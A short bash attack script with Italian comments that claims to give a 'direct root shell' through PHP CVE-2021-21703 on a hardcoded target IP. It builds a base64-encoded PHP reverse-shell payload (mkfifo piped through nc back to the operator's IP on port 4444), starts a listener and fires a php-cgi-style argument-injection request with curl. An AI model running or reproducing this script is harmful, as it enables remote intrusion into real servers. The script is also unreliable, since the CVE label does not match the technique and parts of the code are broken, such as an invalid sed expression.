#!/bin/bash
TARGET_IP="14.225.209.143"
TARGET_PORT="443"
MY_IP=$(curl -s ifconfig.me)
RPORT=4444

clear
echo "🔥 PHP CVE-2021-21703 → DIRECT ROOT SHELL"
echo "📡 ${MY_IP}:${RPORT}"

# 🔥 PAYLOAD PERFETTO (reverse shell + TTY)
PHP_PAYLOAD="<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${MY_IP} ${RPORT} >/tmp/f'); ?>"

# 1. BASE64 PER CVE (IL TRucco)
ENCODED=$(echo -n "${PHP_PAYLOAD}" | base64 -w0)

# 2. LISTENER
echo "[+] Listener active..."
nc -lvnp ${RPORT} &
sleep 1

# 3. EXPLOIT CORRETTO (base64 nel query)
curl -k -s --max-time 10 \
  --resolve "${TARGET_IP}:${TARGET_PORT}:127.0.0.1" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
  -H "X-Forwarded-For: 127.0.0.1" \
  "https://${TARGET_IP}:${TARGET_PORT}/?-d+allow_url_include=1+-d+auto_prepend_file=php://input+-d+input_stream=1&-d+data=$(echo -n "${ENCODED}" | sed 's/=/%3D/g;s/+/%2B/g;s//g')" \
  >/dev/null 2>&1

echo -e "\n🎯 SHELL IN 3 SECONDI..."
sleep 3
